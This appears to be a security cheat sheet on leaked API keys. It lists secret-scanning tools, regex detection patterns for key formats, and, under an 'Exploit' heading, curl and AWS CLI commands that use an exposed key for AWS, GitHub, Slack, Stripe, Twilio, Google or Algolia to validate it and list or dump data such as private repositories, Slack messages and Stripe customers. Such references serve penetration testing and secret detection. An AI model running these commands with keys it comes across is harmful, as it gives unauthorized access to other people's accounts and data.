# API Key Leaks

> API keys are secret tokens used to authenticate requests to APIs. When accidentally exposed in code repositories, configuration files, or client-side code, they can be exploited by attackers to gain unauthorized access to services.

## Summary

* [Tools](#tools)
* [Exploit](#exploit)
  * [Algolia](#algolia)
  * [AWS Access Key](#aws-access-key)
  * [GitHub Token](#github-token)
  * [Google API Key](#google-api-key)
  * [Slack Token](#slack-token)
  * [Stripe Key](#stripe-key)
  * [Twilio API Key](#twilio-api-key)
* [Detection Patterns](#detection-patterns)
* [References](#references)

## Tools

- [truffleHog](https://github.com/trufflesecurity/trufflehog) - Searches through git repositories for secrets
- [gitleaks](https://github.com/gitleaks/gitleaks) - SAST tool for detecting hardcoded secrets
- [detect-secrets](https://github.com/Yelp/detect-secrets) - Detecting secrets within a code base
- [git-secrets](https://github.com/awslabs/git-secrets) - Prevents committing secrets to git repositories
- [keyhacks](https://github.com/streaak/keyhacks) - Checks if API keys are valid

## Exploit

### Algolia

```powershell
curl --request PUT \
  --url https://<application-id>.algolia.net/1/indexes/<index-name>/settings \
  --header 'X-Algolia-API-Key: <api-key>' \
  --header 'X-Algolia-Application-Id: <application-id>'
```

### AWS Access Key

```powershell
# Enumerate the key
aws sts get-caller-identity --access-key-id <access-key-id> --secret-access-key <secret-access-key>

# List S3 buckets
aws s3 ls --access-key-id <access-key-id> --secret-access-key <secret-access-key>

# List IAM users
aws iam list-users --access-key-id <access-key-id> --secret-access-key <secret-access-key>
```

### GitHub Token

```powershell
# Check token validity
curl -H "Authorization: token <github-token>" https://api.github.com/user

# List repositories
curl -H "Authorization: token <github-token>" https://api.github.com/user/repos

# Access private gists
curl -H "Authorization: token <github-token>" https://api.github.com/gists

# List organizations the token has access to
curl -H "Authorization: token <github-token>" https://api.github.com/user/orgs

# Check what scopes the token has (useful for gauging permissions quickly)
curl -sI -H "Authorization: token <github-token>" https://api.github.com/user | grep -i x-oauth-scopes
```

### Google API Key

```powershell
# Test key validity
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<api-key>"

# Maps API abuse
curl "https://maps.googleapis.com/maps/api/geocode/json?address=1600+Amphitheatre+Parkway&key=<api-key>"
```

### Slack Token

```powershell
# Test token validity
curl -s "https://slack.com/api/auth.test" -d "token=<slack-token>"

# List channels
curl -s "https://slack.com/api/conversations.list" -d "token=<slack-token>"

# Dump messages
curl -s "https://slack.com/api/conversations.history" -d "token=<slack-token>&channel=<channel-id>"
```

### Stripe Key

```powershell
# Check balance (confirms key is valid and shows account funds)
curl -s https://api.stripe.com/v1/balance \
  -u <stripe-secret-key>:

# List customers
curl -s https://api.stripe.com/v1/customers \
  -u <stripe-secret-key>:

# List charges
curl -s https://api.stripe.com/v1/charges \
  -u <stripe-secret-key>:
```

### Twilio API Key

```powershell
# Check account details
curl -s https://api.twilio.com/2010-04-01/Accounts/<account-sid>.json \
  -u <account-sid>:<auth-token>

# List phone numbers
curl -s https://api.twilio.com/2010-04-01/Accounts/<account-sid>/IncomingPhoneNumbers.json \
  -u <account-sid>:<auth-token>
```

## Detection Patterns

| Service | Pattern |
|---|---|
| AWS Access Key ID | `AKIA[0-9A-Z]{16}` |
| GitHub Token | `ghp_[a-zA-Z0-9]{36}` |
| Slack Token | `xox[baprs]-[0-9a-zA-Z]{10,48}` |
| Stripe Secret Key | `sk_live_[0-9a-zA-Z]{24}` |
| Google API Key | `AIza[0-9A-Za-z\-_]{35}` |
| Twilio Auth Token | `[0-9a-f]{32}` |

## References

- [keyhacks - streaak](https://github.com/streaak/keyhacks)
- [API Key Security Best Practices - OWASP](https://owasp.org/www-project-api-security/)
